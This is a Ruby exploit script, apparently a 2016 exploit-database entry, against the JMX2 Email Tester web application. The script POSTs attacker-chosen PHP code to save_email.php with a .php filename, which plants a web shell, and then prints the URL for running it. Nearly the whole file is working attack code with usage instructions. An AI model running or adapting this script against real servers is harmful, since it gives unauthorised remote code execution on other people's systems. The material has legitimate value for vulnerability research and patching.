# Exploit Title: JMX2 Email Tester - Web Shell Upload(save_email.php)
# Date: 2016-02-15
# Blog: http://www.hahwul.com
# Vendor Homepage: https://github.com/johnfmorton/jmx2-Email-Tester
# Software Link: https://github.com/johnfmorton/jmx2-Email-Tester/archive/master.zip
# Tested on: debian [wheezy]
# CVE : none

require "net/http"
require "uri"
require 'uri-handler'

if ARGV.length != 2

puts "JMX2 Email Tester Web Shell Uploader"
puts "Usage: #>ruby jmx2Email_exploit.rb [targetURL] [phpCode]"
puts "  targetURL(ex): http://127.0.0.1/vul_test/jmx2-Email-Tester"
puts "  phpCode(ex): echo 'zzzzz'"
puts "  Example : ~~.rb http://127.0.0.1/vul_test/jmx2-Email-Tester/emailTester 'echo zzzz'"
puts "  Install GEM: #> gem install uri-handler"
puts "  exploit & code by hahwul[www.hahwul.com]" 
else
target_url = ARGV[0]    # http://127.0.0.1/jmx2-Email-Tester/
shell = ARGV[1]    # PHP Code
shell = shell.to_uri
exp_url = target_url + "/models/save_email.php"
puts shell
uri = URI.parse(exp_url)
http = Net::HTTP.new(uri.host, uri.port)
puts exp_url
request = Net::HTTP::Post.new(uri.request_uri)
request["Accept-Encoding"] = "gzip, deflate"
request["Referer"] = "http://127.0.0.1/vul_test/jmx2-Email-Tester/emailTester/"
request["User-Agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0"
request["Accept"] = "application/json, text/javascript, */*; q=0.01"
request["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
request["Connection"] = "keep-alive"
request.set_form_data({"orgfilename"=>"test-email-1455499197-org.html","thecontent"=>"%3Chtml%3E%0A%20%20%20%3C%3Fphp%20%0A#{shell}%0A%3F%3E%0A%3C%2Fhtml%3E","inlinefilename"=>"test-email-1455499197-inline.php"})
response = http.request(request)

puts "[Result] Status code: "+response.code
puts "[Result] Open Browser: "+target_url+"/_saved_email_files/test-email-1455499197-inline.php"
end


